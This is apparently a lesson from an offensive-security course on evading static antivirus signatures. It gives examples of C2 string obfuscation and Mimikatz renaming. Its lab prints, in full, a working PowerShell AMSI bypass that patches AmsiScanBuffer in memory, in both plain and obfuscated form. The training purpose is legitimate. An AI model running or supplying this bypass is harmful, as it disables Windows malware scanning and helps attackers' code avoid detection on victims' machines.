# Static code-based signatures

The [Layered Obfuscation Taxonomy](../obfuscation/principles.md) covers the most reliable solutions as part of the 
Obfuscating Methods and Obfuscating Classes layer.

* The techniques class splitting/coalescing and method scattering/aggregation can be grouped into an overarching 
concept of splitting or merging any given OOP (Object-Oriented Programming) function.
* Other techniques such as dropping modifiers or method clone can be grouped into an overarching concept of removing 
or obscuring identifiable information.

## Splitting and merging objects

The methodology required to split or merge objects is very similar to the objective of concatenation: Create a new 
object function that can break the signature while maintaining the previous functionality. 

As an example, in [Using Custom Covenant Listener Profiles & Grunt Templates to Elude AV](https://offensivedefence.co.uk/posts/covenant-profiles-templates/) 
a string is replaced with a call to a new object (class) splitting the message.

The original offending string:

    string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2},""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";

Obfuscated Method: The new class used to replace and concatenate the string.

    public static string GetMessageFormat // Format the public method
    {
        get // Return the property value
        {
            var sb = new StringBuilder(@"{{""GUID"":""{0}"","); // Start the built-in concatenation method
            sb.Append(@"""Type"":{1},"); // Append substrings onto the string
            sb.Append(@"""Meta"":""{2}"",");
            sb.Append(@"""IV"":""{3}"",");
            sb.Append(@"""EncryptedMessage"":""{4}"",");
            sb.Append(@"""HMAC"":""{5}""}}");
            return sb.ToString(); // Return the concatenated string to the class
        }
    }
    
    string MessageFormat = GetMessageFormat

## Removing and obscuring identifiable information

Applying [removing identifiable information](../obfuscation/info.md) to identified signatures in any objects 
including methods and classes.

An example of this can be found in Mimikatz where an alert is generated for the string `wdigest.dl`l. This can be 
solved by replacing the string with any random identifier changed throughout all instances of the string. This can 
be categorised in the [obfuscation taxonomy](../obfuscation/principles.md) under the method `proxy technique`.

## Lab

Obfuscate the following PowerShell snippet, using AmsiTrigger to check signatures. Once sufficiently obfuscated, 
submit the snippet to the webserver at `http://IP address/challenge-1.html`. The file name must be saved as 
`challenge-1.ps1`. If correctly obfuscated a flag will appear in an alert pop-up.

```text
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

## Obfuscated code

```text
$MethodDefinition = @'

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ASBD = "AmsiS"+"canBuffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ASBD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = new-object byte [] 6
$buf[0] = [UInt32]0xB8
$buf[1] = [UInt32]0x57
$buf[2] = [UInt32]0x00
$buf[3] = [Uint32]0x07
$buf[4] = [Uint32]0x80
$buf[5] = [Uint32]0xC3
[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

[DEFCON-27-Workshop-Anthony-Rose-Introduction-to-AMSI-Bypasses-and-Sandbox-Evasion-Notes.pdf](https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20workshops/DEFCON-27-Workshop-Anthony-Rose-Introduction-to-AMSI-Bypasses-and-Sandbox-Evasion-Notes.pdf):

This method works by using C# to expose the native API calls in `Kernel32` to powershell. This allows us to obtain 
where in memory the AMSI Scan buffer is and patch in a command to return a good scan result prior to the function 
actually scanning our commands. It does not cause AMSI to fail instead preserving the appearance of the scan being 
completed fully. APTs have been observed using 
[this technique in the wild](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/).

And flag!
